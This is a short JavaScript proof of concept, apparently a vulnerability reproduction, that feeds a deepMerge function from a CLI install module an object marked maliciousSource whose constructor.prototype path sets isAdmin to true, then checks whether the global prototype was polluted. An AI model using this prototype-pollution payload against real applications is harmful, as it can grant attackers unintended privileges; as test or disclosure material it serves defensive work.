const { deepMerge } = require("./dist/cli/cmd-install.js");
const target = {};
const maliciousSource = {
  constructor: {
    prototype: {
      isAdmin: true,
    },
  },
};
deepMerge(target, maliciousSource);
console.log(target.constructor.prototype.isAdmin);
